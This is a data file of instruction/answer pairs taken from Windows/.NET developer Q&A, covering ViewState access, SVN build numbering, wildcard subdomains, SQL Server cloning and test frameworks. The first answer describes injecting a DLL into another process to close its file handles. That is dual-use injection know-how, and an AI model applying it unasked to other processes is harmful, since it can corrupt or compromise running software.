{"instruction": "I'm looking for a way to delete a file which is locked by another process using C#. I suspect the method must be able to find which process is locking the file (perhaps by tracking the handles, although I'm not sure how to do this in C#) then close that process before being able to complete the file delete using File.Delete().", "output": "The typical method is as follows. You've said you want to do this in C# so here goes...\n\nIf you don't know which process has the file locked, you'll need to examine each process's handle list, and query each handle to determine if it identifies the locked file. Doing this in C# will likely require P/Invoke or an intermediary C++/CLI to call the native APIs you'll need.\nOnce you've figured out which process(es) have the file locked, you'll need to safely inject a small native DLL into the process (you can also inject a managed DLL, but this is messier, as you then have to start or attach to the .NET runtime).\nThat bootstrap DLL then closes the handle using CloseHandle etc.\nEssentially: the way to unlock a \"locked\" file is to inject a DLL into the offending process's address space and close it yourself. You can do this using native or managed code. No matter what, you're going to need a small amount of native code or at least P/Invoke into the same.\nHelpful links:\n\nhttp://www.codeproject.com/KB/threads/winspy.aspx\nhttp://damianblog.com/2008/07/02/net-code-injection/\nGood luck!"}
{"instruction": "I need to grab the base64-encoded representation of the ViewState. Obviously this would not be available until fairly late in the request lifecycle, which is OK.\nFor example, if the output of the page includes:\n<input type=\"hidden\" name=\"__VIEWSTATE\" \n  id=\"__VIEWSTATE\" value=\"/wEPDwUJODU0Njc5MD...==\" />\n\nI need a way on the server side to get the value \"/wEPDwUJODU0Njc5MD...==\"\nTo clarify, I need this value when the page is being rendered, not on PostBack. e.g. I need to know the ViewState value that is being sent to the client, not the ViewState I'm getting back from them.", "output": "Rex, I suspect a good place to start looking is solutions that compress the ViewState -- they're grabbing ViewState on the server before it's sent down to the client and gzipping it. That's exactly where you want to be.\n\nScott Hanselman on ViewState Compression (2005)\nViewState Compression with System.IO.Compression (2007)"}
{"instruction": "What is the correct way to get the process size on Solaris, HP-UX and AIX? Should we use top or ps -o vsz or something else?", "output": "Yes, you are right to lock at the VSZ.\nps u will give you the VSZ and RSS, which are the virtual memory size and resident set size.  The RSS is how much physical memory has been allocated to the process, and the VSZ is the virtual memory size of the process.  If you have several copies of a program running, a lot of the memory in the VSZ will be shared between those processes."}
{"instruction": "I need to grab the base64-encoded representation of the ViewState. Obviously this would not be available until fairly late in the request lifecycle, which is OK.\nFor example, if the output of the page includes:\n<input type=\"hidden\" name=\"__VIEWSTATE\" \n  id=\"__VIEWSTATE\" value=\"/wEPDwUJODU0Njc5MD...==\" />\n\nI need a way on the server side to get the value \"/wEPDwUJODU0Njc5MD...==\"\nTo clarify, I need this value when the page is being rendered, not on PostBack. e.g. I need to know the ViewState value that is being sent to the client, not the ViewState I'm getting back from them.", "output": "See this blog post where the author describes a method for overriding the default behavior for generating the ViewState and instead shows how to save it on the server Session object.\n\nIn ASP.NET 2.0, ViewState is saved by\r\n  a descendant of PageStatePersister\r\n  class. This class is an abstract class\r\n  for saving and loading ViewsState and\r\n  there are two implemented descendants\r\n  of this class in .Net Framework, named\r\n  HiddenFieldPageStatePersister and\r\n  SessionPageStatePersister. By default\r\n  HiddenFieldPageStatePersister is used\r\n  to save/load ViewState information,\r\n  but we can easily get the\r\n  SessionPageStatePersister to work and\r\n  save ViewState in Session object.\n\nAlthough I did not test his code, it seems to show exactly what you want: a way to gain access to ViewState code while still on the server, before postback."}
{"instruction": "I am using CCNET on a sample project with SVN as my source control. CCNET is configured to create a build on every check in. CCNET uses MSBuild to build the source code.\nI would like to use the latest revision number to generate AssemblyInfo.cs while compiling.\r\nHow can I retrieve the latest revision from subversion and use the value in CCNET?\nEdit: I'm not using NAnt - only MSBuild.", "output": "I am currently \"manually\" doing it through a prebuild-exec Task, using my cmdnetsvnrev tool, but if someone knows a better ccnet-integrated way of doing it, i'd be happy to hear :-)"}
{"instruction": "I am using CCNET on a sample project with SVN as my source control. CCNET is configured to create a build on every check in. CCNET uses MSBuild to build the source code.\nI would like to use the latest revision number to generate AssemblyInfo.cs while compiling.\r\nHow can I retrieve the latest revision from subversion and use the value in CCNET?\nEdit: I'm not using NAnt - only MSBuild.", "output": "I found this project on google code. This is CCNET plugin to generate the label in CCNET.\nThe DLL is tested with CCNET 1.3 but it works with CCNET 1.4 for me. I'm successfully using this plugin to label my build.\nNow onto passing it to MSBuild..."}
{"instruction": "I am using CCNET on a sample project with SVN as my source control. CCNET is configured to create a build on every check in. CCNET uses MSBuild to build the source code.\nI would like to use the latest revision number to generate AssemblyInfo.cs while compiling.\r\nHow can I retrieve the latest revision from subversion and use the value in CCNET?\nEdit: I'm not using NAnt - only MSBuild.", "output": "You have basically two options. Either you write a simple script that will start and parse output from\nsvn.exe info --revision HEAD\nto obtain revision number (then generating AssemblyInfo.cs is pretty much straight forward) or just use plugin for CCNET. Here it is:\n\nSVN Revision Labeller is a plugin for\n  CruiseControl.NET that allows you to\n  generate CruiseControl labels for your\n  builds, based upon the revision number\n  of your Subversion working copy. This\n  can be customised with a prefix and/or\n  major/minor version numbers.\nhttp://code.google.com/p/svnrevisionlabeller/\n\nI prefer the first option because it's only roughly 20 lines of code:\nusing System;\nusing System.Diagnostics;\n\nnamespace SvnRevisionNumberParserSample\n{\n    class Program\n    {\n        static void Main()\n        {\n            Process p = Process.Start(new ProcessStartInfo()\n                {\n                    FileName = @\"C:\\Program Files\\SlikSvn\\bin\\svn.exe\", // path to your svn.exe\n                    UseShellExecute = false,\n                    RedirectStandardOutput = true,\n                    Arguments = \"info --revision HEAD\",\n                    WorkingDirectory = @\"C:\\MyProject\" // path to your svn working copy\n                });\n\n            // command \"svn.exe info --revision HEAD\" will produce a few lines of output\n            p.WaitForExit();\n\n            // our line starts with \"Revision: \"\n            while (!p.StandardOutput.EndOfStream)\n            {\n                string line = p.StandardOutput.ReadLine();\n                if (line.StartsWith(\"Revision: \"))\n                {\n                    string revision = line.Substring(\"Revision: \".Length);\n                    Console.WriteLine(revision); // show revision number on screen                       \n                    break;\n                }\n            }\n\n            Console.Read();\n        }\n    }\n}"}
{"instruction": "I am using CCNET on a sample project with SVN as my source control. CCNET is configured to create a build on every check in. CCNET uses MSBuild to build the source code.\nI would like to use the latest revision number to generate AssemblyInfo.cs while compiling.\r\nHow can I retrieve the latest revision from subversion and use the value in CCNET?\nEdit: I'm not using NAnt - only MSBuild.", "output": "If you prefer doing it on the MSBuild side over the CCNet config, looks like the MSBuild Community Tasks extension's SvnVersion task might do the trick."}
{"instruction": "I am looking to allow users to control of subdomain of an app I am toying with, much like Basecamp where it is customusername.seework.com.\nWhat is required on the DNS end to allow these to be created dynamically and be available instantly. \nAnd how do you recommend dealing with this in the logic of the site? Htaccess rule to  lookup the subdomain in the DB?", "output": "The trick to that is to use URL rewriting so that name.domain.com transparently maps to something like domain.com/users/name on your server.  Once you start down that path, it's fairly trivial to implement."}
{"instruction": "I am looking to allow users to control of subdomain of an app I am toying with, much like Basecamp where it is customusername.seework.com.\nWhat is required on the DNS end to allow these to be created dynamically and be available instantly. \nAnd how do you recommend dealing with this in the logic of the site? Htaccess rule to  lookup the subdomain in the DB?", "output": "Don't worry about DNS and URL rewriting\nYour DNS record will be static, something like:\n*.YOURDOMAIN.COM A 123.123.123.123\nAsk your DNS provider to do it for you (if it's not done already) or do it by yourself if you have control over your DNS records. This will automatically point all your subdomains (current and future ones) into the same HTTP server.\nOnce it's done, you will only need to parse HOST header on every single http request to detect what hostname was used to access your server-side scripts on your http server.\nAssuming you're using ASP.NET, this is kind of silly example I came up with but works and demonstrates simplicity of this approach:\n<%@ Language=\"C#\" %><%string subDomain = Request.Url.Host.Split('.')[0].ToUpper();if (subDomain == \"CLIENTXXX\") Response.Write(\"Hello CLIENTXXX, your secret number is 33\");else if (subDomain == \"CLIENTYYY\") Response.Write(\"Hello CLIENTYYY, your secret number is 44\");else Response.Write(subDomain+\" doesn't exist\");%>"}
{"instruction": "I am using CCNET on a sample project with SVN as my source control. CCNET is configured to create a build on every check in. CCNET uses MSBuild to build the source code.\nI would like to use the latest revision number to generate AssemblyInfo.cs while compiling.\r\nHow can I retrieve the latest revision from subversion and use the value in CCNET?\nEdit: I'm not using NAnt - only MSBuild.", "output": "Customizing csproj files to autogenerate AssemblyInfo.cs \nhttp://www.codeproject.com/KB/dotnet/Customizing_csproj_files.aspx\nEvery time we create a new C# project,\r\n  Visual Studio puts there the\r\n  AssemblyInfo.cs file for us. The file\r\n  defines the assembly meta-data like\r\n  its version, configuration, or\r\n  producer.\n\nFound the above technique to auto-gen AssemblyInfo.cs using MSBuild. Will post sample shortly."}
{"instruction": "I am looking to allow users to control of subdomain of an app I am toying with, much like Basecamp where it is customusername.seework.com.\nWhat is required on the DNS end to allow these to be created dynamically and be available instantly. \nAnd how do you recommend dealing with this in the logic of the site? Htaccess rule to  lookup the subdomain in the DB?", "output": "The way we do this is to have a 'catch all' for our domain name registered in DNS so that anything.ourdomain.com will point to our server.\nWith Apache you can set up a similar catch-all for your vhosts.  The ServerName must be a single static name but the ServerAlias directive can contain a pattern.\nServername www.ourdomain.com\nServerAlias *.ourdomain.com\n\nNow all of the domains will trigger the vhost for our project.  The final part is to decode the domain name actually used so that you can work out the username in your code, something like (PHP):\nlist( $username ) = explode( \".\", $_SERVER[ \"HTTP_HOST\" ] );\n\nor a RewriteRule as already suggested that silently maps user.ourdomain.com/foo/bar to www.ourdomain.com/foo/bar?user=user or whatever you prefer."}
{"instruction": "I am using CCNET on a sample project with SVN as my source control. CCNET is configured to create a build on every check in. CCNET uses MSBuild to build the source code.\nI would like to use the latest revision number to generate AssemblyInfo.cs while compiling.\r\nHow can I retrieve the latest revision from subversion and use the value in CCNET?\nEdit: I'm not using NAnt - only MSBuild.", "output": "I have written a NAnt build file that handles parsing SVN information and creating properties. I then use those property values for a variety of build tasks, including setting the label on the build. I use this target combined with the SVN Revision Labeller mentioned by lubos hasko with great results.\n<target name=\"svninfo\" description=\"get the svn checkout information\">    <property name=\"svn.infotempfile\" value=\"${build.directory}\\svninfo.txt\" />    <exec program=\"${svn.executable}\" output=\"${svn.infotempfile}\">        <arg value=\"info\" />    </exec>    <loadfile file=\"${svn.infotempfile}\" property=\"svn.info\" />    <delete file=\"${svn.infotempfile}\" />    <property name=\"match\" value=\"\" />    <regex pattern=\"URL: (?'match'.*)\" input=\"${svn.info}\" />    <property name=\"svn.info.url\" value=\"${match}\"/>    <regex pattern=\"Repository Root: (?'match'.*)\" input=\"${svn.info}\" />    <property name=\"svn.info.repositoryroot\" value=\"${match}\"/>    <regex pattern=\"Revision: (?'match'\\d+)\" input=\"${svn.info}\" />    <property name=\"svn.info.revision\" value=\"${match}\"/>    <regex pattern=\"Last Changed Author: (?'match'\\w+)\" input=\"${svn.info}\" />    <property name=\"svn.info.lastchangedauthor\" value=\"${match}\"/>    <echo message=\"URL: ${svn.info.url}\" />    <echo message=\"Repository Root: ${svn.info.repositoryroot}\" />    <echo message=\"Revision: ${svn.info.revision}\" />    <echo message=\"Last Changed Author: ${svn.info.lastchangedauthor}\" /></target>"}
{"instruction": "I am using MSBuild to build my stuff. I want to use CruiseControl.net as by Build Server.\nNow, CCNET refers nAnt a lot, but it looks as if ccnet can do most of the stuff nant could do through the project configuration and msbuild. Also, nAnt seems a bit unsupported, with a Beta release that is almost a year old now.\nIn short: I am actually quite happy with MSBuild (especially since it's the \"official\" compiler front end) and a bit uncomfortable with nAnt, but I do not want to judge prematurely.\nWhat would be reasons to use nAnt over MSBuild? Especially with ccnet, which seems to overlap a bit with nant in terms of features (and adding the automated build related stuff)", "output": "In my opinion it is more a question of personal preference.  nAnt is a great framework and MSBuild is almost as capable.  With the ability to easily develop custom tasks (in both frameworks) you can accomplish almost anything that you need to do.\nI cannot answer the \"still supported\" portion of your questions, but I would say if you are already comfortable with nAnt then it's probably viable.  If you (or someone in your group) is familiar with MSBuild then that is a fine way to go as well."}
{"instruction": "I am using MSBuild to build my stuff. I want to use CruiseControl.net as by Build Server.\nNow, CCNET refers nAnt a lot, but it looks as if ccnet can do most of the stuff nant could do through the project configuration and msbuild. Also, nAnt seems a bit unsupported, with a Beta release that is almost a year old now.\nIn short: I am actually quite happy with MSBuild (especially since it's the \"official\" compiler front end) and a bit uncomfortable with nAnt, but I do not want to judge prematurely.\nWhat would be reasons to use nAnt over MSBuild? Especially with ccnet, which seems to overlap a bit with nant in terms of features (and adding the automated build related stuff)", "output": "Honestly it depends on what fits in to your environment better.  If you are using a lot of Non-Microsoft tools, nunit, ccnet, ncover.  You will probably find better support with nant.  Alternatively if you are using MSTest, TFSBuild, you will probably find MSBuild a better environment.  I would learn both and use which every fits more smoothly with your environment."}
{"instruction": "I am using MSBuild to build my stuff. I want to use CruiseControl.net as by Build Server.\nNow, CCNET refers nAnt a lot, but it looks as if ccnet can do most of the stuff nant could do through the project configuration and msbuild. Also, nAnt seems a bit unsupported, with a Beta release that is almost a year old now.\nIn short: I am actually quite happy with MSBuild (especially since it's the \"official\" compiler front end) and a bit uncomfortable with nAnt, but I do not want to judge prematurely.\nWhat would be reasons to use nAnt over MSBuild? Especially with ccnet, which seems to overlap a bit with nant in terms of features (and adding the automated build related stuff)", "output": "If you've already got a bunch of custom tasks you use with nAnt, stick with it - you don't gain much with MSBuild.  That said, there doesn't seem to be anything that nAnt can do that MSBuild can't at its core.  Both can call external tools, both can run .Net-based custom tasks, and both have a bunch of community tasks out there.\nWe're using MSBuild here for the same reason you are - it's the default build system for VS now, and we didn't have any nAnt-specific stuff to worry about.\nThe MSBuildCommunityTasks are a good third-party task base to start with, and covers most of the custom stuff I ever did in nAnt, including VSS and Subversion support."}
{"instruction": "I'm setting up a dedicated SQL Server 2005 box on Windows Server 2008 this week, and would like to pare it down to be as barebones as possible while still being fully functional.\nTo that end, the \"Server Core\" option sounds appealing, but I'm not clear about whether or not I can run SQL Server on that SKU.  Several services are addressed on the Microsoft website, but I don't see any indication about SQL Server.\nDoes anyone know definitively?", "output": "Not sure how credible this source is, but:\n\nThe Windows Server 2008 Core edition can:\n\nRun the file server role.\nRun the Hyper-V virtualization server role.\nRun the Directory Services role.\nRun the DHCP server role.\nRun the IIS Web server role.\nRun the DNS server role.\nRun Active Directory Lightweight Directory Services.\nRun the print server role.\n\nThe Windows Server 2008 Core edition cannot:\n\nRun a SQL Server.\nRun an Exchange Server.\nRun Internet Explorer.\nRun Windows Explorer.\nHost a remote desktop session.\nRun MMC snap-in consoles locally."}
{"instruction": "I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.\nNow, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.\nWould you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).\nOr - given the lack of \"EXPLAIN CREATE TABLE\" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).\nAnd lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.\nNow, i hear a lot of great stuff about the Red Gate products, but for hobby projects, the price is a bit steep.\nSo, what are you using to automatically deploy SQL Server Databases from Test to Live?", "output": "Using SMO/DMO, it isn't too difficult to generate a script of your schema.  Data is a little more fun, but still doable.\nIn general, I take \"Script It\" approach, but you might want to consider something along these lines:\n\nDistinguish between Development and Staging, such that you can Develop with a subset of data ... this I would create a tool to simply pull down some production data, or generate fake data where security is concerned.\nFor team development, each change to the database will have to be coordinated amongst your team members.  Schema and data changes can be intermingled, but a single script should enable a given feature.  Once all your features are ready, you bundle these up in a single SQL file and run that against a restore of production.\nOnce your staging has cleared acceptance, you run the single SQL file again on the production machine.\n\nI have used the Red Gate tools and they are great tools, but if you can't afford it, building the tools and working this way isn't too far from the ideal."}
{"instruction": "I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.\nNow, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.\nWould you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).\nOr - given the lack of \"EXPLAIN CREATE TABLE\" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).\nAnd lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.\nNow, i hear a lot of great stuff about the Red Gate products, but for hobby projects, the price is a bit steep.\nSo, what are you using to automatically deploy SQL Server Databases from Test to Live?", "output": "Like Rob Allen, I use SQL Compare / Data Compare by Redgate. I also use the Database publishing wizard by Microsoft. I also have a console app I wrote in C# that takes a sql script and runs it on a server. This way you can run large scripts with 'GO' commands in it from a command line or in a batch script.\nI use Microsoft.SqlServer.BatchParser.dll and Microsoft.SqlServer.ConnectionInfo.dll libraries in the console application."}
{"instruction": "I would like the version property of my application to be incremented for each build but I'm not sure on how to enable this functionality in Visual Studio (2005/2008). I have tried to specify the AssemblyVersion as 1.0.* but it doesn't get me exactly what I want. \nI'm also using a settings file and in earlier attempts when the assembly version changed my settings got reset to the default since the application looked for the settings file in another directory. \nI would like to be able to display a version number in the form of 1.1.38 so when a user finds a problem I can log the version they are using as well as tell them to upgrade if they have an old release.\nA short explanation of how the versioning works would also be appreciated. When does the build and revision number get incremented?", "output": "Some time ago I wrote a quick and dirty exe that would update the version #'s in an assemblyinfo.{cs/vb} - I also have used rxfind.exe (a simple and powerful regex-based search replace tool) to do the update from a command line as part of the build process.  A couple of other helpfule hints:\n\nseparate the assemblyinfo into product parts (company name, version, etc.) and assembly specific parts (assembly name etc.).  See here\nAlso - i use subversion, so I found it helpful to set the build number to subversion revision number thereby making it really easy to always get back to the codebase that generated the assembly (e.g. 1.4.100.1502 was built from revision 1502)."}
{"instruction": "I always create a new empty database, after that backup and restore of the existing database into it, but is this really the best way? As it seems very error prone and over complicated for me.", "output": "It is possible to skip the step of creating the empty database. You can create the new database as part of the restore process.\nThis is actually the easiest and best way I know of to clone a database. You can eliminate errors by scripting the backup and restore process rather than running it through the SQL Server Management Studio\nThere are two other options you could explore:\n\nDetach the database, copy the .mdf file and re-attach.\nUse SQL Server Integration Services (SSIS) to copy all the objects over\n\nI suggest sticking with backup and restore and automating if necessary."}
{"instruction": "If I'm adding a column to a table in Microsoft SQL Server, can I control where the column is displayed logically in queries?\nI don't want to mess with the physical layout of columns on disk, but I would like to logically group columns together when possible so that tools like SQL Server Management Studio list the contents of the table in a convenient way.\nI know that I can do this through SQL Management Studio by going into their \"design\" mode for tables and dragging the order of columns around, but I'd like to be able to do it in raw SQL so that I can perform the ordering scripted from the command line.", "output": "You can not do this programatically (in a safe way that is) without creating a new table. \nWhat Enterprise Manager does when you commit a reordering is to create a new table, move the data and then delete the old table and rename the new table to the existing name. \nIf you want your columns in a particular order/grouping without altering their physical order, you can create a view which can be whatever you desire."}
{"instruction": "If I'm adding a column to a table in Microsoft SQL Server, can I control where the column is displayed logically in queries?\nI don't want to mess with the physical layout of columns on disk, but I would like to logically group columns together when possible so that tools like SQL Server Management Studio list the contents of the table in a convenient way.\nI know that I can do this through SQL Management Studio by going into their \"design\" mode for tables and dragging the order of columns around, but I'd like to be able to do it in raw SQL so that I can perform the ordering scripted from the command line.", "output": "When Management Studio does it, it's creating a temporary table, copying everything across, dropping your original table and renaming the temporary table.  There's no simple equivalent T-SQL statement.\nIf you don't fancy doing that, you could always create a view of the table with the columns in the order you'd like and use that?\nEdit: beaten!"}
{"instruction": "I always create a new empty database, after that backup and restore of the existing database into it, but is this really the best way? As it seems very error prone and over complicated for me.", "output": "Here's a dynamic sql script I've used in the past.  It can be further modified but it will give you the basics.  I prefer scripting it to avoid the mistakes you can make using the Management Studio:\nDeclare @OldDB varchar(100)Declare @NewDB varchar(100)Declare @vchBackupPath varchar(255)Declare @query varchar(8000)/*Test code to implement Select @OldDB = 'Pubs'Select @NewDB = 'Pubs2'Select @vchBackupPath = '\\\\dbserver\\C$\\Program Files\\Microsoft SQL Server\\MSSQL.1\\MSSQL\\Backup\\pubs.bak'*/SET NOCOUNT ON;Select @query = 'Create Database ' + @NewDBexec(@query)Select @query = 'Declare @vBAKPath varchar(256)declare @oldMDFName varchar(100)declare @oldLDFName varchar(100)declare @newMDFPath varchar(100)declare @newLDFPath varchar(100)declare @restQuery varchar(800)select @vBAKPath = ''' + @vchBackupPath + '''select @oldLDFName = name from ' + @OldDB +'.dbo.sysfiles where filename like ''%.ldf%''select @oldMDFName = name from  ' + @OldDB +'.dbo.sysfiles where filename like ''%.mdf%''select @newMDFPath = physical_name from ' + @NewDB +'.sys.database_files where type_desc = ''ROWS''select @newLDFPath = physical_name from ' + @NewDB +'.sys.database_files where type_desc = ''LOG''select @restQuery = ''RESTORE DATABASE ' + @NewDB + ' FROM DISK = N'' + '''''''' + @vBAKpath + '''''''' + '' WITH MOVE N'' + '''''''' + @oldMDFName + '''''''' +  '' TO N'' + '''''''' + @newMDFPath + '''''''' +  '', MOVE N'' + '''''''' + @oldLDFName + '''''''' +  '' TO N'' + '''''''' + @newLDFPath + '''''''' +  '', NOUNLOAD, REPLACE, STATS = 10''exec(@restQuery)--print @restQuery'exec(@query)"}
{"instruction": "I am using MSBuild to build my stuff. I want to use CruiseControl.net as by Build Server.\nNow, CCNET refers nAnt a lot, but it looks as if ccnet can do most of the stuff nant could do through the project configuration and msbuild. Also, nAnt seems a bit unsupported, with a Beta release that is almost a year old now.\nIn short: I am actually quite happy with MSBuild (especially since it's the \"official\" compiler front end) and a bit uncomfortable with nAnt, but I do not want to judge prematurely.\nWhat would be reasons to use nAnt over MSBuild? Especially with ccnet, which seems to overlap a bit with nant in terms of features (and adding the automated build related stuff)", "output": "If you are quite happy with MSBuild, then I would stick with MSBuild.  This may be one of those cases where the tool you learn first is the one you will prefer.  I started with NAnt and can't quite get used to MSBuild.  I'm sure they will both be around for quite some time.\nThere are some fundamental differences between the two, probably best highlighted by this conversation between some NAnt fans and a Microsoftie.\nInterestingly, Jeremy Miller asked the exact opposite question on his blog last year."}
{"instruction": "Getting back into a bit more .NET after a few-years of not using it full-time, and wondering what the good unit testing packages are these days.\nI'm familiar with NUnit (a few years ago), and have played briefly around with IronRuby, with the goal of getting something like rspec going, but don't know much beyond that.\nI realize I could google for this and call it a day but I believe I'm likely to get a better and more informed response from asking a question here :-)\nSuggestions?", "output": "I like MbUnit, er, Gallio.  Most importantly to me is having good tools support inside Visual Studio.  For that I use Resharper, which has an MbUnit test runner.  A lot of folks seem to like TestDriven.NET as their test runner as well."}
{"instruction": "What is the correct way to get the process size on Solaris, HP-UX and AIX? Should we use top or ps -o vsz or something else?", "output": "The exact definitions of \"vsize,\" \"rss,\" \"rprvt,\" \"rshrd,\" and other obscure-looking abbreviations vary from OS to OS.  The manual pages for the \"top\" and \"ps\" commands will have some sort of description, but all such descriptions are simplified greatly (or are based on long-extinct kernel implementations).  \"Process size\" as a concept is fiendishly difficult to pin down in the general case.  Answers in specific instances depend heavily on the actual memory management implementation in the OS, and are rarely as satisfying as the tidy \"process size\" concept that exists in the minds of most users (and most developers).\nFor example, none of those numbers (nor, likely, any combination of them) can be used to tell you exactly how many such processes can run at once in a given amount of free memory.  But really, your best bet is to come at it from that end: why do you want this number, and what will you use it for?  Given that information, I think you'll get more useful answers."}
{"instruction": "I always create a new empty database, after that backup and restore of the existing database into it, but is this really the best way? As it seems very error prone and over complicated for me.", "output": "The Publish to Provider functionality has worked great for me.  See Scott Gu's Blog Entry.\nIf you need something really robust look  at redgate software's tools here...if you are doing much SQL at all, these are worth the $$."}
{"instruction": "I always create a new empty database, after that backup and restore of the existing database into it, but is this really the best way? As it seems very error prone and over complicated for me.", "output": "Backup and Restore is the most straight-forward way I know.  You have to be careful between servers as security credentials don't come with the restored database."}
{"instruction": "Is it possible to create \"federated\" Subversion servers?\r\nAs in one server at location A and another at location B that sync up their local versions of the repository automatically.  That way when someone at either location interacts with the repository they are accessing their respective local server and therefore has faster response times.", "output": "Sounds like you might like Git. There's a Google Talk explaining all about it."}
{"instruction": "Is it possible to create \"federated\" Subversion servers?\r\nAs in one server at location A and another at location B that sync up their local versions of the repository automatically.  That way when someone at either location interacts with the repository they are accessing their respective local server and therefore has faster response times.", "output": "Its probably not exactly what your looking for, but you may be able to implement OS level clustering."}
{"instruction": "Getting back into a bit more .NET after a few-years of not using it full-time, and wondering what the good unit testing packages are these days.\nI'm familiar with NUnit (a few years ago), and have played briefly around with IronRuby, with the goal of getting something like rspec going, but don't know much beyond that.\nI realize I could google for this and call it a day but I believe I'm likely to get a better and more informed response from asking a question here :-)\nSuggestions?", "output": "I like TestDriven.NET (even though I use ReSharper) and I'm pretty happy with XUnit.net. It uses Facts instead of Tests which many people dislike but I like the difference in terminology. It's useful to think of a collection of automatically provable Facts about your software and see which ones you violate when you make a change.\nBe aware that Visual Studio 2008 Professional (and above) now comes with integrated Unit Testing (it used to be available only with the Team System Editions) and may be suitable for your needs."}
{"instruction": "Getting back into a bit more .NET after a few-years of not using it full-time, and wondering what the good unit testing packages are these days.\nI'm familiar with NUnit (a few years ago), and have played briefly around with IronRuby, with the goal of getting something like rspec going, but don't know much beyond that.\nI realize I could google for this and call it a day but I believe I'm likely to get a better and more informed response from asking a question here :-)\nSuggestions?", "output": "There are so many it's crazy.  Crazy good, I guess.\n\nFor the conservative types (me), NUnit is still available and still more than capable.\nFor the Microsoft-types, MSTest is adequate, but slow and clunky compared to Nunit.  It also lacks code coverage without paying the big bucks for the pricey versions of Visual Studio.\nThere's also MbUnit.  It's like NUnit, but has nifty features like RowTest (run the same test with different parameters) and Rollback (put the database back like you found it after a test) \nAnd finally, xUnit.net is the trendy option with some attitude.\nOh, and TestDriven.NET will give you IDE integration for both Nunit and MBunit.\n\nI'm sure they're all just fine.  I'd steer away from MSTest though, unless you just enjoy the convenience of having everything in one IDE out of the box.\nScott Hanselman has a podcast on this very topic."}
{"instruction": "PostgreSQL is interesting in that it supports several languages for writing stored procedures.  Which one do you use, and why?", "output": "When I wrote my first trigger it was in Perl because that was the language used in the example I found but the last triggers I wrote where in Python because I'm more comfortable with that.\nI think programmer comfort is my main reason to choose python but I think Perl is still better supported."}
{"instruction": "Is it possible to create \"federated\" Subversion servers?\r\nAs in one server at location A and another at location B that sync up their local versions of the repository automatically.  That way when someone at either location interacts with the repository they are accessing their respective local server and therefore has faster response times.", "output": "This is more or less the perfect use case for SVK.  SVK is a command line front end for subversion that works with an entire local copy of the repository.  So your commits, updates, etc. work on the local repository and you can then sync with a master.  I would generally recommend SVK over plain subversion anyway as it makes a lot of things nicer.  No .svn folders, better branching and merging, better conflict resolution."}
{"instruction": "I am working on a collection of classes used for video playback and recording. I have one main class which acts like the public interface, with methods like play(), stop(), pause(), record() etc... Then I have workhorse classes which do the video decoding and video encoding. \nI just learned about the existence of nested classes in C++, and I'm curious to know what programmers think about using them. I am a little wary and not really sure what the benefits/drawbacks are, but they seem (according to the book I'm reading) to be used in cases such as mine.\nThe book suggests that in a scenario like mine, a good solution would be to nest the workhorse classes inside the interface class, so there are no separate files for classes the client is not meant to use, and to avoid any possible naming conflicts? I don't know about these justifications. Nested classes are a new concept to me. Just want to see what programmers think about the issue.", "output": "One way of deciding whether or not to use nested classes is to think whether or not this class plays a supporting role or it's own part.\nIf it exists solely for the purpose of helping another class then I generally make it a nested class. There are a whole load of caveats to that, some of which seem contradictory but it all comes down to experience and gut-feeling."}
{"instruction": "I am working on a collection of classes used for video playback and recording. I have one main class which acts like the public interface, with methods like play(), stop(), pause(), record() etc... Then I have workhorse classes which do the video decoding and video encoding. \nI just learned about the existence of nested classes in C++, and I'm curious to know what programmers think about using them. I am a little wary and not really sure what the benefits/drawbacks are, but they seem (according to the book I'm reading) to be used in cases such as mine.\nThe book suggests that in a scenario like mine, a good solution would be to nest the workhorse classes inside the interface class, so there are no separate files for classes the client is not meant to use, and to avoid any possible naming conflicts? I don't know about these justifications. Nested classes are a new concept to me. Just want to see what programmers think about the issue.", "output": "sounds like a case where you could use the strategy pattern"}
{"instruction": "I need to grab the base64-encoded representation of the ViewState. Obviously this would not be available until fairly late in the request lifecycle, which is OK.\nFor example, if the output of the page includes:\n<input type=\"hidden\" name=\"__VIEWSTATE\" \n  id=\"__VIEWSTATE\" value=\"/wEPDwUJODU0Njc5MD...==\" />\n\nI need a way on the server side to get the value \"/wEPDwUJODU0Njc5MD...==\"\nTo clarify, I need this value when the page is being rendered, not on PostBack. e.g. I need to know the ViewState value that is being sent to the client, not the ViewState I'm getting back from them.", "output": "I enabled compression following similar articles to those posted above. The key to accessing the ViewState before the application sends it was overriding this method;\nprotected override void SavePageStateToPersistenceMedium(object viewState)\nYou can call the base method within this override and then add whatever additional logic you require to handle the ViewState."}
{"instruction": "I currently use a DataTable to get results from a database which I can use in my code.\nHowever, many example on the web show using a DataSet instead and accessing the table(s) through the collections method.\nIs there any advantage, performance wise or otherwise, of using DataSets or DataTables as a storage method for SQL results?", "output": "in 1.x there used to be things DataTables couldn't do which DataSets could (don't remember exactly what). All that was changed in 2.x.  My guess is that's why a lot of examples still use DataSets.  DataTables should be quicker as they are more lightweight. If you're only pulling a single resultset, its your best choice between the two."}
